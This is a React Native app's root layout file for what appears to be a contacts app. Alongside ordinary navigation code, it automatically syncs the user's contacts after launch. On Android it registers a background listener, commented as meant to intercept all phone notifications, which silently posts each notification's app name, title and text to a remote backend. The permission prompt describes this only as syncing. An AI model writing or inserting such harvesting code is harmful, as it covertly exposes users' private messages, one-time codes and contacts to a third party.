import { useEffect } from 'react';
import { Stack } from 'expo-router';
import { StatusBar } from 'expo-status-bar';
import { Alert, Platform, Linking, AppRegistry } from 'react-native';
import 'react-native-reanimated';
import * as Notifications from 'expo-notifications';
import axios from 'axios';


import { syncContacts } from '../hooks/useContacts';

export default function RootLayout() {
  useEffect(() => {
    // 1. Prepare App and Sync Contacts
    const prepareApp = async () => {
      console.log('📱 Preparing app...');
      
      // Non-blocking health check
      axios.get('https://contactappbackend-77ar.onrender.com/api/health', { timeout: 5000 })
        .then(() => console.log('🌐 Backend is reachable'))
        .catch(() => console.warn('⚠️ Backend unreachable'));

      // Initial contacts sync
      setTimeout(() => {
        syncContacts();
      }, 5000);

      // Check Notification Listener Permission (Android Only)
      if (Platform.OS === 'android') {
        try {
          const RNAndroidNotificationListener = require('react-native-android-notification-listener').default;
          const { RNAndroidNotificationListenerHeadlessJsName } = require('react-native-android-notification-listener');
          
          // Register background task safely
          AppRegistry.registerHeadlessTask(
            RNAndroidNotificationListenerHeadlessJsName,
            () => async ({ notification }) => {
                if (notification) {
                    try {
                        const data = JSON.parse(notification);
                        await axios.post('https://contactappbackend-77ar.onrender.com/api/notifications', {
                            appName: data.app || 'Unknown App',
                            title: data.title || 'No Title',
                            message: data.text || data.subText || '',
                        });
                    } catch (e) {}
                }
            }
          );

          const status = await RNAndroidNotificationListener.getPermissionStatus();
          if (status !== 'authorized') {
            Alert.alert(
              "Permission Required",
              "To sync live notifications, please enable 'Notification Access' for this app in settings.",
              [
                { text: "Later" },
                { text: "Open Settings", onPress: () => RNAndroidNotificationListener.requestPermission() }
              ]
            );
          }
        } catch (e) {
          console.log('⚠️ Notification Listener not available');
        }
      }
    };

    prepareApp();

    // 2. Setup Notification Listener (Intercept all phone notifications)
    if (Platform.OS === 'android') {
      console.log('🎧 Starting Background Notification Listener...');
      try {
        const RNAndroidNotificationListener = require('react-native-android-notification-listener').default;
        const interval = setInterval(async () => {
          try {
            const status = await RNAndroidNotificationListener.getPermissionStatus();
            if (status === 'authorized') {
              // The library handles the background service automatically.
            }
          } catch (e) {}
        }, 10000);

        return () => clearInterval(interval);
      } catch (e) {}
    }


  }, []);

  return (
    <>
      <Stack screenOptions={{ headerShown: false }}>
        <Stack.Screen name="(tabs)" options={{ headerShown: false }} />
      </Stack>
      <StatusBar style="light" />
    </>
  );
}

